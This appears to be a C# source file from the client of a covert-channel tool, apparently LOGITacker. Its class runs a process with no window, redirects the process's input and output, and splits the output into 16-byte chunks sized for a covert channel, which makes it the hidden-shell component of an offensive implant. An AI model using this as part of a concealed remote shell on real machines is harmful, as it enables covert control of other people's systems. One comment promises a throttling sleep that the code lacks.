using System.Threading;
using System.Collections;
using System.Collections.Generic; //for List
using System.Diagnostics;

namespace LogitackerClient
{
    class RProc
    {
        private Process process;
        private ProcessStartInfo processStartInfo;

        private Thread thread_out;
        private Thread thread_err;

        private System.Collections.Queue OutputQueue;

        public RProc(bool withStdErr, string filename, string args)
        {
            this.OutputQueue = Queue.Synchronized(new Queue());
            this.processStartInfo = new ProcessStartInfo(filename, args);
            this.processStartInfo.CreateNoWindow = true;

            this.processStartInfo.UseShellExecute = false;
            this.processStartInfo.RedirectStandardInput = true;
            this.processStartInfo.RedirectStandardOutput = true;
            if (withStdErr)  this.processStartInfo.RedirectStandardError = true;
            

            this.process = new Process();
            this.process.StartInfo = this.processStartInfo;

            try // exception isn't thrown to the caller otherwise
            {
                this.process.Start();
            }
            finally { }

            this.thread_out = new Thread(new ThreadStart(this.OutLoop));
            thread_out.Start();

            if (withStdErr)
            {
                this.thread_err = new Thread(new ThreadStart(this.StderrLoop));
                thread_err.Start();
            }
        }

        public void ToStdin(byte[] data)
        {
            if (!this.process.HasExited)
            {
                this.process.StandardInput.BaseStream.Write(data, 0, data.Length);
                this.process.StandardInput.Flush();
            }
        }

        private void OutLoop()
        {
            int READ_BUFFER_SIZE = 16; //max covert channelpayload length
            byte[] readBuf = new byte[READ_BUFFER_SIZE];
            List<byte> readbufCopy = new List<byte>();

            while (!this.process.HasExited)
            {
                //This could be a CPU consuming loop if much output is produced and couldn't be delivered fast enough
                //as our theoretical maximum transfer rate is 60000 Bps we introduce a sleep when the out_queue_size exceeds 60000 bytes
                int count = this.process.StandardOutput.BaseStream.Read(readBuf, 0, readBuf.Length);

                // trim data down to count
                readbufCopy.AddRange(readBuf);

                //readbufCopy.GetRange(0, count);
                readbufCopy.RemoveRange(count, READ_BUFFER_SIZE - count);

                byte[] data = readbufCopy.ToArray();
                this.OutputQueue.Enqueue(data);

                readbufCopy.Clear();

            }
        }
        private void StderrLoop()
        {
            int READ_BUFFER_SIZE = 16; //max covert channelpayload length
            byte[] readBuf = new byte[READ_BUFFER_SIZE];
            List<byte> readbufCopy = new List<byte>();

            while (!this.process.HasExited)
            {
                //This could be a CPU consuming loop if much output is produced and couldn't be delivered fast enough
                //as our theoretical maximum transfer rate is 60000 Bps we introduce a sleep when the out_queue_size exceeds 60000 bytes
                int count = this.process.StandardError.BaseStream.Read(readBuf, 0, readBuf.Length);

                // trim data down to count
                readbufCopy.AddRange(readBuf);

                //readbufCopy.GetRange(0, count);
                readbufCopy.RemoveRange(count, READ_BUFFER_SIZE - count);

                byte[] data = readbufCopy.ToArray();
                this.OutputQueue.Enqueue(data);

                readbufCopy.Clear();

            }
        }

        public bool HasOut()
        {
            return this.OutputQueue.Count > 0;
        }

        public byte[] GetOut()
        {
            return (byte[])this.OutputQueue.Dequeue();
        }

        public bool IsRunning()
        {
            return !this.process.HasExited;
        }
    }
}